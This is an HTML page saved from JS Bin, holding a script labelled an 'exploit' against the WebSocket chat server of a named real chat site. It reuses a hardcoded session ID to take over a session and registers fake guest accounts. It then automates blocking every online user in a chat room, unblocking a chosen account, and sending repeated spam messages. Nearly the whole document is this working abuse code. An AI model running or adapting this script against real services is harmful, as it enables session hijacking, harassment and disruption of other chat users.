
<!DOCTYPE html>
<!--
Created using JS Bin
http://jsbin.com
Copyright (c) 2019 by thegirlwiththedragontatoo (http://jsbin.com/zumijez/1/edit)
Released under the MIT license: http://jsbin.mit-license.org
-->
<meta name="robots" content="noindex">
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>JS Bin</title>
</head>
<body>
  <script>
    console.log("start exploit...");
    const MSG = "Mazhai :P";
    const ROOM = "kudumi";
	  var blockall = false;
	  var unblockall = false;
    var guest = false;
    var allok = false;
    var guestname = "Dragon";
    var user = '';
    var role = '';
    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
    ws.onmessage = function(m) {
      var jsonData = JSON.parse(m.data);
      var dataType = jsonData.type;
      console.log("message----",jsonData.data);
      if(dataType=="register"){
        	user = jsonData.data.username;
          role = jsonData.data.role
           if(jsonData.data.status=="success"){
           	if((user != 'mazhai')&&(user == 'umayal')){
			self_blocker();
// 			blocker();
//             	getblocklist();
               /* window.setInterval(function() {
                  send(ROOM, MSG);
               }, 2000); */
            	/* send() */;
            }
           }
          if(jsonData.data.status=="guest"){
          	guest = true;
            register(guestname);
          }
           if(jsonData.data.type=="error"){
          	guestname = guestname + Math.floor((Math.random() * 10) + 1);
            register(guestname);
          }
        }
      if(dataType=="blocks"){
	      if(jsonData.data.blocks){
			if(unblockall) jsonData.data.blocks.forEach((i)=>ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}})));
	      }
      }
    if(dataType=="onliners"){
	    if(jsonData.data.onliners){
		    if(blockall) jsonData.data.onliners.forEach((i)=>ws.send(JSON.stringify({"type":"block-user","data":{"username":i.username}})));
	    }			
      }
    }
    console.log("ws--",ws);
    initsession = () => {
    	ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2rkbi"}}));
    }
    register = (guestname) => {
    	 if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":guestname,"gender":"male"}}));}
    }
    send = (room,msg) => {
    	console.log("state:", guest, user, role);
      if(ws.OPEN){
        ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
        ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
    }}
    getblocklist = () => {
    	 if(ws.OPEN){
       	ws.send(JSON.stringify({"type":"blocks","data":["a"]}));
       }
    }
    blocker = () => {
    	 if(ws.OPEN){
       	ws.send(JSON.stringify({"type":"block-user","data":{"username":"sam londonn"}}));
       }
    }
    fetch_room = (r) => {
	     if(ws.OPEN){
       	ws.send(JSON.stringify({"type":"fetch","data":{"room":r}}));
       }
    }
    self_blocker = () => {
    	blockall = true;
	    fetch_room(ROOM);
    }
    self_unblocker = () => {
    	unblockall = true;
	    if(ws.OPEN){ws.send(JSON.stringify({"type":"blocks","data":["a"]}));}
    }
    ws.onopen = () => {
      initsession();
			register(guestname);
      /* window.setTimeout(function() {
        connect(guestname);
      }, 6000); */

      window.setTimeout(function() {
        ws.close();
	      console.log("closed");
      }, 120000);
    }
    
    
  </script>
</body>
</html>
